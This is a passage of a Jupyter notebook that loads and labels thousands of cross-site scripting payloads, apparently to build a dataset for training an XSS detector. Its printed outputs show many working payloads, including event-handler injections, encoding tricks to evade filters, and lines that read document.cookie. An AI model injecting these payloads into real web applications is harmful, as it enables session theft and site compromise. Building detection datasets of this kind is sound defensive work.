      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "payload",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "xss",
         "rawType": "int64",
         "type": "integer"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "7a9c6521-6bdc-4f6a-b8a5-01b146bb1d6c",
       "rows": [
        [
         "0",
         "\"-prompt(8)-\"",
         "1"
        ],
        [
         "1",
         "'-prompt(8)-'",
         "1"
        ],
        [
         "2",
         "\";a=prompt,a()//",
         "1"
        ],
        [
         "3",
         "';a=prompt,a()//",
         "1"
        ],
        [
         "4",
         "'-eval(\"window['pro'%2B'mpt'](8)\")-'",
         "1"
        ],
        [
         "5",
         "\"-eval(\"window['pro'%2B'mpt'](8)\")-\"",
         "1"
        ],
        [
         "6",
         "\"onclick=prompt(8)>\"@x.y",
         "1"
        ],
        [
         "7",
         "\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y",
         "1"
        ],
        [
         "8",
         "<image/src/onerror=prompt(8)>",
         "1"
        ],
        [
         "9",
         "<img/src/onerror=prompt(8)>",
         "1"
        ],
        [
         "10",
         "<image src/onerror=prompt(8)>",
         "1"
        ],
        [
         "11",
         "<img src/onerror=prompt(8)>",
         "1"
        ],
        [
         "12",
         "<image src =q onerror=prompt(8)>",
         "1"
        ],
        [
         "13",
         "<img src =q onerror=prompt(8)>",
         "1"
        ],
        [
         "14",
         "</scrip</script>t><img src =q onerror=prompt(8)>",
         "1"
        ],
        [
         "15",
         "<script\\x20type=\"text/javascript\">javascript:alert(1);</script>",
         "1"
        ],
        [
         "16",
         "<script\\x3Etype=\"text/javascript\">javascript:alert(1);</script>",
         "1"
        ],
        [
         "17",
         "<script\\x0Dtype=\"text/javascript\">javascript:alert(1);</script>",
         "1"
        ],
        [
         "18",
         "<script\\x09type=\"text/javascript\">javascript:alert(1);</script>",
         "1"
        ],
        [
         "19",
         "<script\\x0Ctype=\"text/javascript\">javascript:alert(1);</script>",
         "1"
        ],
        [
         "20",
         "<script\\x2Ftype=\"text/javascript\">javascript:alert(1);</script>",
         "1"
        ],
        [
         "21",
         "<script\\x0Atype=\"text/javascript\">javascript:alert(1);</script>",
         "1"
        ],
        [
         "22",
         "'`\"><\\x3Cscript>javascript:alert(1)</script>",
         "1"
        ],
        [
         "23",
         "'`\"><\\x00script>javascript:alert(1)</script>",
         "1"
        ],
        [
         "24",
         "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>",
         "1"
        ],
        [
         "25",
         "<audio src=1 href=1 onerror=\"javascript:alert(1)\"></audio>",
         "1"
        ],
        [
         "26",
         "<video src=1 href=1 onerror=\"javascript:alert(1)\"></video>",
         "1"
        ],
        [
         "27",
         "<body src=1 href=1 onerror=\"javascript:alert(1)\"></body>",
         "1"
        ],
        [
         "28",
         "<image src=1 href=1 onerror=\"javascript:alert(1)\"></image>",
         "1"
        ],
        [
         "29",
         "<object src=1 href=1 onerror=\"javascript:alert(1)\"></object>",
         "1"
        ],
        [
         "30",
         "<script src=1 href=1 onerror=\"javascript:alert(1)\"></script>",
         "1"
        ],
        [
         "31",
         "<svg onResize svg onResize=\"javascript:javascript:alert(1)\"></svg onResize>",
         "1"
        ],
        [
         "32",
         "<title onPropertyChange title onPropertyChange=\"javascript:javascript:alert(1)\"></title onPropertyChange>",
         "1"
        ],
        [
         "33",
         "<iframe onLoad iframe onLoad=\"javascript:javascript:alert(1)\"></iframe onLoad>",
         "1"
        ],
        [
         "34",
         "<body onMouseEnter body onMouseEnter=\"javascript:javascript:alert(1)\"></body onMouseEnter>",
         "1"
        ],
        [
         "35",
         "<body onFocus body onFocus=\"javascript:javascript:alert(1)\"></body onFocus>",
         "1"
        ],
        [
         "36",
         "<frameset onScroll frameset onScroll=\"javascript:javascript:alert(1)\"></frameset onScroll>",
         "1"
        ],
        [
         "37",
         "<script onReadyStateChange script onReadyStateChange=\"javascript:javascript:alert(1)\"></script onReadyStateChange>",
         "1"
        ],
        [
         "38",
         "<html onMouseUp html onMouseUp=\"javascript:javascript:alert(1)\"></html onMouseUp>",
         "1"
        ],
        [
         "39",
         "<body onPropertyChange body onPropertyChange=\"javascript:javascript:alert(1)\"></body onPropertyChange>",
         "1"
        ],
        [
         "40",
         "<svg onLoad svg onLoad=\"javascript:javascript:alert(1)\"></svg onLoad>",
         "1"
        ],
        [
         "41",
         "<body onPageHide body onPageHide=\"javascript:javascript:alert(1)\"></body onPageHide>",
         "1"
        ],
        [
         "42",
         "<body onMouseOver body onMouseOver=\"javascript:javascript:alert(1)\"></body onMouseOver>",
         "1"
        ],
        [
         "43",
         "<body onUnload body onUnload=\"javascript:javascript:alert(1)\"></body onUnload>",
         "1"
        ],
        [
         "44",
         "<body onLoad body onLoad=\"javascript:javascript:alert(1)\"></body onLoad>",
         "1"
        ],
        [
         "45",
         "<bgsound onPropertyChange bgsound onPropertyChange=\"javascript:javascript:alert(1)\"></bgsound onPropertyChange>",
         "1"
        ],
        [
         "46",
         "<html onMouseLeave html onMouseLeave=\"javascript:javascript:alert(1)\"></html onMouseLeave>",
         "1"
        ],
        [
         "47",
         "<html onMouseWheel html onMouseWheel=\"javascript:javascript:alert(1)\"></html onMouseWheel>",
         "1"
        ],
        [
         "48",
         "<style onLoad style onLoad=\"javascript:javascript:alert(1)\"></style onLoad>",
         "1"
        ],
        [
         "49",
         "<iframe onReadyStateChange iframe onReadyStateChange=\"javascript:javascript:alert(1)\"></iframe onReadyStateChange>",
         "1"
        ]
       ],
       "shape": {
        "columns": 2,
        "rows": 2640
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>payload</th>\n",
       "      <th>xss</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>\"-prompt(8)-\"</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>'-prompt(8)-'</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>\";a=prompt,a()//</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>';a=prompt,a()//</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>'-eval(\"window['pro'%2B'mpt'](8)\")-'</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2635</th>\n",
       "      <td>\"&gt;&lt;s\"%2b\"cript&gt;alert(document.cookie)&lt;/script&gt;</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2636</th>\n",
       "      <td>foo&lt;script&gt;alert(1)&lt;/script&gt;</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2637</th>\n",
       "      <td>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2638</th>\n",
       "      <td>&lt;SCRIPT&gt;String.fromCharCode(97, 108, 101, 114,...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2639</th>\n",
       "      <td>&lt;marquee onstart='javascript:alert('1');'&gt;=(◕_◕)=</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>2640 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                payload  xss\n",
       "0                                         \"-prompt(8)-\"    1\n",
       "1                                         '-prompt(8)-'    1\n",
       "2                                      \";a=prompt,a()//    1\n",
       "3                                      ';a=prompt,a()//    1\n",
       "4                  '-eval(\"window['pro'%2B'mpt'](8)\")-'    1\n",
       "...                                                 ...  ...\n",
       "2635     \"><s\"%2b\"cript>alert(document.cookie)</script>    1\n",
       "2636                       foo<script>alert(1)</script>    1\n",
       "2637         <scr<script>ipt>alert(1)</scr</script>ipt>    1\n",
       "2638  <SCRIPT>String.fromCharCode(97, 108, 101, 114,...    1\n",
       "2639  <marquee onstart='javascript:alert('1');'>=(◕_◕)=    1\n",
       "\n",
       "[2640 rows x 2 columns]"
      ]
     },
     "execution_count": 798,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "payloads[\"xss\"] = 1\n",
    "payloads"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 799,
   "metadata": {},
   "outputs": [],
   "source": [
    "payloads.to_csv(\"../Datasets/Processed/xss_payloads.csv\", index=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Anon payloads\n",
    "### anon_test_payloads.txt and anon_train_payloads.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 800,
   "metadata": {},
   "outputs": [],
   "source": [
    "atep = open(\"../Datasets/anon_test_payloads.txt\", \"r\")\n",
    "atrp = open(\"../Datasets/anon_train_payloads.txt\", \"r\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 801,
   "metadata": {},
   "outputs": [],
   "source": [
    "atep = [payload.strip() for payload in atep.readlines()]\n",
    "atrp = [payload.strip() for payload in atrp.readlines()]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 802,
   "metadata": {},
   "outputs": [],
   "source": [
    "atep = pd.DataFrame(atep, columns=[\"payload\"])\n",
    "atrp = pd.DataFrame(atrp, columns=[\"payload\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 803,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "payload",
         "rawType": "object",
         "type": "string"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "696ffe03-7311-4d1d-8abb-c91593005149",
       "rows": [
        [
         "0",
         "<script id=x tabindex=1 onbeforeactivate=alert(1)></script>"
        ],
        [
         "1",
         "<style>:target {color:red;}</style><legend id=x style=\"transition:color 1s\" onwebkittransitionend=alert(1)></legend>"
        ],
        [
         "2",
         "<summary onpointerout=alert(1) style=display:block>AnonKryptiQuz</summary>"
        ],
        [
         "3",
         "&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;"
        ],
        [
         "4",
         "<animate onpointerdown=alert(1) style=display:block>AnonKryptiQuz</animate>"
        ],
        [
         "5",
         "<thead draggable=\"true\" ondrag=\"alert(1)\">AnonKryptiQuz</thead>"
        ],
        [
         "6",
         "<x OnXxx=1"
        ],
        [
         "7",
         "<lol/onauxclick=[0].some(alert)>rightclickhere"
        ],
        [
         "8",
         "a=alert,a(1)"
        ],
        [
         "9",
         "<style>@keyframes slidein {}</style><u style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></u>"
        ],
        [
         "10",
         "<wbr ondblclick=\"alert(1)\">AnonKryptiQuz</wbr>"
        ],
        [
         "11",
         "<keygen onbeforecopy=\"alert(1)\" contenteditable>AnonKryptiQuz</keygen>"
        ],
        [
         "12",
         "<element onmouseout=\"alert(1)\" style=display:block>AnonKryptiQuz</element>"
        ],
        [
         "13",
         "<blink id=x tabindex=1 onbeforeactivate=alert(1)></blink>"
        ],
        [
         "14",
         "&lt;A HREF=\\\"//www&#46;google&#46;com/\\\"&gt;XSS&lt;/A&gt;"
        ],
        [
         "15",
         "<html onkeypress=\"alert(1)\" contenteditable style=display:block>AnonKryptiQuz</html>"
        ],
        [
         "16",
         "<span onmousemove=\"alert(1)\">AnonKryptiQuz</span>"
        ],
        [
         "17",
         "%00%00%00%00%00%00%00<script>alert(1)</script>"
        ],
        [
         "18",
         "<span onmouseenter=\"alert(1)\" style=display:block>AnonKryptiQuz</span>"
        ],
        [
         "19",
         "{{window['eval'](window['atob'](window['decodeURIComponent']('Ij48aW1nIHNyYz14IG9uZXJyb3I9cHJvbXB0KGRvY3VtZW50LmNvb2tpZSk7PjEy')))}}"
        ],
        [
         "20",
         "<th onclick=\"alert(1)\" style=display:block>AnonKryptiQuz</th>"
        ],
        [
         "21",
         "#\\'-alert(1)//"
        ],
        [
         "22",
         "<u oncut=alert(1) value=\"AnonKryptiQuz\" autofocus tabindex=1 style=display:block>AnonKryptiQuz"
        ],
        [
         "23",
         "<object data=\"data:text/html;base64,%(base64)s\">"
        ],
        [
         "24",
         "<dt onkeydown=\"alert(1)\" contenteditable>AnonKryptiQuz</dt>"
        ],
        [
         "25",
         "<acronym draggable=\"true\" ondragenter=\"alert(1)\">AnonKryptiQuz</acronym>"
        ],
        [
         "26",
         "<input onmouseup=\"alert(1)\" style=display:block>AnonKryptiQuz</input>"
        ],
        [
         "27",
         "--><!--*{color:red}   /* all UA */"
        ],
        [
         "28",
         "<meter draggable=\"true\" ondragenter=\"alert(1)\" style=display:block>AnonKryptiQuz</meter>"
        ],
        [
         "29",
         "<noframes oncontextmenu=\"alert(1)\">AnonKryptiQuz</noframes>"
        ],
        [
         "30",
         "<style>:target {color:red;}</style><map id=x style=\"transition:color 1s\" ontransitionend=alert(1)></map>"
        ],
        [
         "31",
         "<label>type a,b,c,d - watch the network tab/traffic (JS is off, laAnonKryptiQuz NoScript)</label>"
        ],
        [
         "32",
         "<header draggable=\"true\" ondragenter=\"alert(1)\" style=display:block>AnonKryptiQuz</header>"
        ],
        [
         "33",
         "<br onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</br><input value=clickme>"
        ],
        [
         "34",
         "$(\"script(2)\")"
        ],
        [
         "35",
         "<style>:target {transform: rotate(180deg);}</style><header id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></header>"
        ],
        [
         "36",
         "<embed onbeforepaste=\"alert(1)\" contenteditable>AnonKryptiQuz</embed>"
        ],
        [
         "37",
         "<source onmousewheel=alert(1) style=display:block>requires scrolling"
        ],
        [
         "38",
         "<svg><td onload=alert(1)></td>"
        ],
        [
         "39",
         "%3Cform%20action%3D%60javascript%3Aalert%28%60AnonKryptiQuz%60%29%60%3E%3Cinput%20type%3Dsubmit%3E%3C%2Fform%3E"
        ],
        [
         "40",
         "<summary onkeyup=\"alert(1)\" contenteditable style=display:block>AnonKryptiQuz</summary>"
        ],
        [
         "41",
         "%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%0d%0a%0a%3Cscript%3Ealert(1);%3C/script%3E"
        ],
        [
         "42",
         "&lt;HTML&gt;&lt;BODY&gt;"
        ],
        [
         "43",
         "<template oncontextmenu=\"alert(1)\" style=display:block>AnonKryptiQuz</template>"
        ],
        [
         "44",
         "<del draggable=\"true\" ondragstart=\"alert(1)\">AnonKryptiQuz</del>"
        ],
        [
         "45",
         "<input type=radio id=x onfocus=alert(1)>"
        ],
        [
         "46",
         "<keygen id=x tabindex=1 onactivate=alert(1)></keygen>"
        ],
        [
         "47",
         "<video onmousedown=\"alert(1)\" style=display:block>AnonKryptiQuz</video>"
        ],
        [
         "48",
         "<dir onbeforecut=\"alert(1)\" contenteditable>AnonKryptiQuz</dir>"
        ],
        [
         "49",
         "<tbody onpointermove=alert(1) style=display:block>AnonKryptiQuz</tbody>"
        ]
       ],
       "shape": {
        "columns": 1,
        "rows": 3609
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>payload</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>&lt;script id=x tabindex=1 onbeforeactivate=alert...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>&lt;style&gt;:target {color:red;}&lt;/style&gt;&lt;legend id=...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>&lt;summary onpointerout=alert(1) style=display:b...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>&amp;lt;BODY BACKGROUND=&amp;quot;javascript:alert(&amp;ap...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>&lt;animate onpointerdown=alert(1) style=display:...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3604</th>\n",
       "      <td>a=\\\"get\\\";</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3605</th>\n",
       "      <td>&lt;p oncopy=alert(1) value=\"AnonKryptiQuz\" autof...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3606</th>\n",
       "      <td>&lt;div draggable=\"true\" contenteditable&gt;drag me&lt;...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3607</th>\n",
       "      <td>\"`'&gt;&lt;script&gt;\\xE2\\x80\\x8Ajavascript:alert(1)&lt;/s...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3608</th>\n",
       "      <td>&lt;div id=\"97\"&gt;&lt;!-- IE 5-9 --&gt;</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>3609 rows × 1 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                payload\n",
       "0     <script id=x tabindex=1 onbeforeactivate=alert...\n",
       "1     <style>:target {color:red;}</style><legend id=...\n",
       "2     <summary onpointerout=alert(1) style=display:b...\n",
       "3     &lt;BODY BACKGROUND=&quot;javascript:alert(&ap...\n",
       "4     <animate onpointerdown=alert(1) style=display:...\n",
       "...                                                 ...\n",
       "3604                                         a=\\\"get\\\";\n",
       "3605  <p oncopy=alert(1) value=\"AnonKryptiQuz\" autof...\n",
       "3606  <div draggable=\"true\" contenteditable>drag me<...\n",
       "3607  \"`'><script>\\xE2\\x80\\x8Ajavascript:alert(1)</s...\n",
       "3608                       <div id=\"97\"><!-- IE 5-9 -->\n",
       "\n",
       "[3609 rows x 1 columns]"
      ]
     },
     "execution_count": 803,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "atep "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 804,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "payload",
         "rawType": "object",
         "type": "string"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "4d8277d5-4e73-476f-bb64-5a1f46fd86a2",
       "rows": [
        [
         "0",
         "{{constructor.constructor(valueOf.name.constructor.fromCharCode(97,108,101,114,116,40,49,41,10))()}}"
        ],
        [
         "1",
         "<blockquote id=x tabindex=1 ondeactivate=alert(1)></blockquote><input id=y autofocus>"
        ],
        [
         "2",
         "<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>"
        ],
        [
         "3",
         "<data onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</data><input value=clickme>"
        ],
        [
         "4",
         "<details onmouseup=\"alert(1)\">AnonKryptiQuz</details>"
        ],
        [
         "5",
         "<param ondblclick=\"alert(1)\">AnonKryptiQuz</param>"
        ],
        [
         "6",
         "<em draggable=\"true\" ondragleave=\"alert(1)\">AnonKryptiQuz</em>"
        ],
        [
         "7",
         "<image src=\"javascript:alert(1)\">"
        ],
        [
         "8",
         "<data onkeypress=\"alert(1)\" contenteditable>AnonKryptiQuz</data>"
        ],
        [
         "9",
         "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><head id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></head>"
        ],
        [
         "10",
         "<button draggable=\"true\" ondragstart=\"alert(1)\">AnonKryptiQuz</button>"
        ],
        [
         "11",
         "<noembed onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</noembed><input value=clickme>"
        ],
        [
         "12",
         "<XSS STYLE=\"behavior: url(xss.htc);\">"
        ],
        [
         "13",
         "<;/TITLE>;<;SCRIPT>;alert(\"XSS\");<;/SCRIPT>;"
        ],
        [
         "14",
         "<script src=\"\\\\%(jscript)s\"></script>"
        ],
        [
         "15",
         "<style>:target {transform: rotate(180deg);}</style><table id=x style=\"transition:transform 2s\" ontransitionrun=print()></table>"
        ],
        [
         "16",
         "<template draggable=\"true\" ondrag=\"alert(1)\">AnonKryptiQuz</template>"
        ],
        [
         "17",
         "<cite onmousedown=\"alert(1)\">AnonKryptiQuz</cite>"
        ],
        [
         "18",
         "<div draggable=\"true\" contenteditable>drag me</div><tt ondragover=alert(1) contenteditable style=display:block>drop here</tt>"
        ],
        [
         "19",
         "<img2 onmouseover=\"alert(1)\" style=display:block>AnonKryptiQuz</img2>"
        ],
        [
         "20",
         "<canvas onbeforecopy=\"alert(1)\" contenteditable>AnonKryptiQuz</canvas>"
        ],
        [
         "21",
         "<button popovertarget=x>Click me</button><nextid ontoggle=alert(1) popover id=x>AnonKryptiQuz</nextid>"
        ],
        [
         "22",
         "<div draggable=\"true\" contenteditable>drag me</div><s ondragover=alert(1) contenteditable style=display:block>drop here</s>"
        ],
        [
         "23",
         "<button onmouseout=\"alert(1)\">AnonKryptiQuz</button>"
        ],
        [
         "24",
         "[[constructor.constructor('alert(document.cookie)')()]]"
        ],
        [
         "25",
         "<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>"
        ],
        [
         "26",
         "<style>@keyframes slidein {}</style><div style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onwebkitanimationiteration=\"alert(1)\"></div>"
        ],
        [
         "27",
         "<style>:target {transform: rotate(180deg);}</style><rt id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></rt>"
        ],
        [
         "28",
         "<sup onmouseleave=\"alert(1)\" style=display:block>AnonKryptiQuz</sup>"
        ],
        [
         "29",
         "<div draggable=\"true\" contenteditable>drag me</div><noframes ondrop=alert(1) contenteditable style=display:block>drop here</noframes>"
        ],
        [
         "30",
         "vbscript:prompt(1)#{\"action\":1}"
        ],
        [
         "31",
         "<h1 onmouseleave=\"alert(1)\" style=display:block>AnonKryptiQuz</h1>"
        ],
        [
         "32",
         "<figure oncopy=alert(1) value=\"AnonKryptiQuz\" autofocus tabindex=1 style=display:block>AnonKryptiQuz"
        ],
        [
         "33",
         "<dd onmouseover=\"alert(1)\" style=display:block>AnonKryptiQuz</dd>"
        ],
        [
         "34",
         "<link onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</link><input value=clickme>"
        ],
        [
         "35",
         "<form id=x tabindex=1 onbeforedeactivate=alert(1)></form><input autofocus>"
        ],
        [
         "36",
         "<style>:target {color: red;}</style><caption id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></caption>"
        ],
        [
         "37",
         "<style>:target {color: red;}</style><footer id=x style=\"transition:color 10s\" ontransitioncancel=print()></footer>"
        ],
        [
         "38",
         "<content onpointerleave=alert(1) style=display:block>AnonKryptiQuz</content>"
        ],
        [
         "39",
         "<output draggable=\"true\" ondragstart=\"alert(1)\" style=display:block>AnonKryptiQuz</output>"
        ],
        [
         "40",
         "<script>Object.prototype.BOOMR = 1;"
        ],
        [
         "41",
         "<element onpointerdown=alert(1) style=display:block>AnonKryptiQuz</element>"
        ],
        [
         "42",
         "<time contenteditable onbeforeinput=alert(1)>AnonKryptiQuz"
        ],
        [
         "43",
         "<bdo onkeyup=\"alert(1)\" contenteditable style=display:block>AnonKryptiQuz</bdo>"
        ],
        [
         "44",
         "<base onfocusout=alert(1) tabindex=1 id=x></base><input autofocus>"
        ],
        [
         "45",
         "<IMG SRC=x ondrag=\"alert(String.fromCharCode(88,83,83))\">"
        ],
        [
         "46",
         "<td onmouseenter=\"alert(1)\" style=display:block>AnonKryptiQuz</td>"
        ],
        [
         "47",
         "\"></video>"
        ],
        [
         "48",
         "<style>:target {transform: rotate(180deg);}</style><img id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></img>"
        ],
        [
         "49",
         "</body>"
        ]
       ],
       "shape": {
        "columns": 1,
        "rows": 14437
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>payload</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>{{constructor.constructor(valueOf.name.constru...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>&lt;blockquote id=x tabindex=1 ondeactivate=alert...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>&lt;!--&gt;&lt;svg+onload=%27top[%2fal%2f%2esource%2b%2...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>&lt;data onblur=alert(1) id=x tabindex=1 style=di...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>&lt;details onmouseup=\"alert(1)\"&gt;AnonKryptiQuz&lt;/d...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14432</th>\n",
       "      <td>&lt;style&gt;:target {color:red;}&lt;/style&gt;&lt;mark id=x ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14433</th>\n",
       "      <td>&lt;style&gt;:target {color: red;}&lt;/style&gt;&lt;xmp id=x ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14434</th>\n",
       "      <td>&lt;details onpaste=\"alert(1)\" contenteditable&gt;An...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14435</th>\n",
       "      <td>&lt;data onmouseover=\"alert(1)\" style=display:blo...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14436</th>\n",
       "      <td>&lt;tbody onbeforecopy=\"alert(1)\" contenteditable...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>14437 rows × 1 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                 payload\n",
       "0      {{constructor.constructor(valueOf.name.constru...\n",
       "1      <blockquote id=x tabindex=1 ondeactivate=alert...\n",
       "2      <!--><svg+onload=%27top[%2fal%2f%2esource%2b%2...\n",
       "3      <data onblur=alert(1) id=x tabindex=1 style=di...\n",
       "4      <details onmouseup=\"alert(1)\">AnonKryptiQuz</d...\n",
       "...                                                  ...\n",
       "14432  <style>:target {color:red;}</style><mark id=x ...\n",
       "14433  <style>:target {color: red;}</style><xmp id=x ...\n",
       "14434  <details onpaste=\"alert(1)\" contenteditable>An...\n",
       "14435  <data onmouseover=\"alert(1)\" style=display:blo...\n",
       "14436  <tbody onbeforecopy=\"alert(1)\" contenteditable...\n",
       "\n",
       "[14437 rows x 1 columns]"
      ]
     },
     "execution_count": 804,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "atrp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 805,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "payload",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "xss",
         "rawType": "int64",
         "type": "integer"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "07563fb9-ce63-4a70-aeb3-8240d3a6c36d",
       "rows": [
        [
         "0",
         "<script id=x tabindex=1 onbeforeactivate=alert(1)></script>",
         "1"
        ],
        [
         "1",
         "<style>:target {color:red;}</style><legend id=x style=\"transition:color 1s\" onwebkittransitionend=alert(1)></legend>",
         "1"
        ],
        [
         "2",
         "<summary onpointerout=alert(1) style=display:block>AnonKryptiQuz</summary>",
         "1"
        ],
        [
         "3",
         "&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;",
         "1"
        ],
        [
         "4",
